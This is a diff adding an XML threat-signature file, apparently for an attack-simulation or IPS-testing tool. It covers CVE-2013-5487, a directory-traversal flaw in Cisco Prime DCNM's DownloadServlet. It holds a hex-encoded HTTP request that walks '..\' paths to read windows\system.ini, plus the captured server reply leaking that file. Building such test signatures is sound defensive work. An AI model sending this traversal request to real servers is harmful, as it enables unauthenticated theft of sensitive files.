@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Cisco Prime Data Center Network Manager DownloadServlet Information Disclosure"/>
+    <EngDesc display="true" value="An information disclosure vulnerability exists in Cisco Prime Data Center Network Manager. The vulnerability is due to lack of authentication and insufficient input validation in &lt;italic&gt;DownloadServlet&lt;/italic&gt; when processing HTTP requests. A remote unauthenticated attacker can download arbitrary files from arbitrary locations. This can be leveraged to obtain sensitive information from a target system."/>
+    <Intent display="true">
+      <item value="DIRECTORY_TRAVERSAL"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="High"/>
+    <Known_Vendors_Affected display="true">
+      <item value="Cisco_Systems"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Prime_Data_Center_Network_Manager"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Prior_to_6.2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20131205-09"/>
+    <CVEID display="true" value="CVE-2013-5487"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="97428"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="0d66beb7d34f2ffee01499c63e30f8d9"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635358367978893546"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1400491818" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+    <for index="B">
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:50:56:B4:0F:82" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0101" Identification="D1B4" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="06CB" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="33142" destPort="$HTTPdestPort" SeqNumber="715236CF" AckNumber="5FF967DE" HeaderLength="08" WindowSize="002E" Checksum="0B58" UrgentPointer="0000" Options="0101080AF5A8E77D00000000" Payload="474554202F646F776E6C6F6164536572766C65743F73686F7746696C653D2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C77696E646F77735C73797374656D2E696E6920485454502F312E310D0A486F73743A203137322E31362E382E38353A38300D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E31290D0A436F6E74656E742D4C656E6774683A2030200D0A0D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:50:56:B4:0F:82" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0185" Identification="49DE" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="4E1D" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="33142" SeqNumber="5FF967DE" AckNumber="7152379C" HeaderLength="08" WindowSize="FF32" Checksum="FAAE" UrgentPointer="0000" Options="0101080A0031C146F5A8E77C" Payload="485454502F312E3120323030204F4B0D0A5472616E736665722D456E636F64696E673A206368756E6B65640D0A446174653A204672692C2032372044656320323031332031363A33383A313220474D540D0A5365727665723A204170616368650D0A0D0A65370D0A3B20666F722031362D6269742061707020737570706F72740D0A0D0A5B647269766572735D0D0A776176653D6D6D6472762E646C6C0D0A74696D65723D74696D65722E6472760D0A0D0A5B6D63695D0D0A5B64726976657233325D0D0A5B333836656E685D0D0A776F61666F6E743D646F736170702E464F4E0D0A4547413830574F412E464F4E3D4547413830574F412E464F4E0D0A4547413430574F412E464F4E3D4547413430574F412E464F4E0D0A4347413830574F412E464F4E3D4347413830574F412E464F4E0D0A4347413430574F412E464F4E3D4347413430574F412E464F4E0D0A0D0A300D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
